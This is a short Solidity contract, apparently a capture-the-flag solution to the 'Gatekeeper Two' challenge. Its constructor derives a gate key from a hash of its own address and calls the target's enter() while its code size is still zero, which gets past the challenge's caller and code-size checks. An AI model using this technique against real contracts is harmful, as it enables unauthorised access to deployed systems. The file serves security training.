// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "interfaces/IGatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    IGatekeeperTwo gatekeeper;

    constructor(IGatekeeperTwo _gatekeeper) public {
        gatekeeper = _gatekeeper;
        uint64 gateKey = (uint64(0) - 1) ^
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        gatekeeper.enter(bytes8(gateKey));
    }
}
